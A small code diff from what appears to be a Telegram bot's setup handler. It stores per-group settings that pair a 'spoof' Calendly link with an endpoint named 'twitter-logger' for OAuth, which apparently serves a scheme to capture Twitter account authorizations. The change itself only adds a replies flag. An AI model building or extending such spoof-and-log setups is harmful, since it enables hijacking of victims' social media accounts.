@@ -170,6 +170,7 @@ async def setup(update: Update, context: CallbackContext) -> None:
             "spoof": "https://calendly.com/cointele",
             "redirect": "https://calendly.com/cointele",
             "endpoint": f"https://twitter-logger.onrender.com/oauth?identifier={identifier}",
+            "replies": False,
             "authenticated_users": [],
         }
         groups.insert_one(group_data)
